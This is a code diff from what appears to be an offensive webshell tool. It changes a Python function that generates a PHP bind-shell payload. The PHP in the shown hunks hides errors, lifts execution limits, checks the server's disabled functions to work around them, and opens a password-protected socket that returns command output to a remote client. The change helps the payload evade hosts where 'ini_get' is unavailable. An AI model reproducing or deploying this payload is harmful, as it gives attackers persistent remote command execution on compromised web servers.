@@ -1,5 +1,5 @@
 from libs.config import alias, color
-from libs.myapp import send, is_windows
+from libs.myapp import get_ini_value_code, send, is_windows
 from threading import Thread
 from time import sleep
 
@@ -10,7 +10,10 @@ def get_php(port, passwd):
 $port=%s;
 @error_reporting(0);
 @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
-$sQUf=@ini_get('disable_functions');
+if(!function_exists('get_ini_value')) {
+    %s
+}
+$sQUf=@get_ini_value('disable_functions');
 if(!empty($sQUf)){
   $sQUf=preg_replace('/[, ]+/', ',', $sQUf);
   $sQUf=explode(',', $sQUf);
@@ -97,7 +100,7 @@ while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
   @socket_write($msgsock,$o,strlen($o));
 }
 @socket_close($msgsock);
-}""" % (passwd, port)
+}""" % (passwd, port, get_ini_value_code())
     else:
         return """$pass="%s";
 $port="%s";
